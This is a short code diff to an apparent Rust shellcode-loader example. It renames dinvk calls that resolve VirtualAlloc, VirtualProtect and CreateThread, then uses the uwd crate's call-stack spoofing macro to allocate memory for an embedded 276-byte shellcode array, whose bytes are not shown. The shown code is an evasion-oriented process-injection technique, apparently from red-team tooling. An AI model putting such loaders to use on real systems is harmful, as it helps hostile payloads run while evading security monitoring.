@@ -1,4 +1,4 @@
-use dinvk::{GetModuleHandle, GetProcAddress};
+use dinvk::module::{get_module_address, get_proc_address};
 use std::ptr::{copy_nonoverlapping, null_mut};
 use uwd::{AsPointer, spoof};
 
@@ -20,10 +20,10 @@ const SHELLCODE: [u8; 276] = [
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Resolves addresses of the WinAPI functions to be used
-    let kernel32 = GetModuleHandle("kernel32.dll", None);
-    let virtual_alloc = GetProcAddress(kernel32, "VirtualAlloc", None);
-    let virtual_protect = GetProcAddress(kernel32, "VirtualProtect", None);
-    let create_thread = GetProcAddress(kernel32, "CreateThread", None);
+    let kernel32 = get_module_address("kernel32.dll", None);
+    let virtual_alloc = get_proc_address(kernel32, "VirtualAlloc", None);
+    let virtual_protect = get_proc_address(kernel32, "VirtualProtect", None);
+    let create_thread = get_proc_address(kernel32, "CreateThread", None);
 
     // Allocate memory with RW using spoofed VirtualAlloc
     let addr = spoof!(virtual_alloc, null_mut::<u8>(), SHELLCODE.len(), 0x3000, 0x04)?;
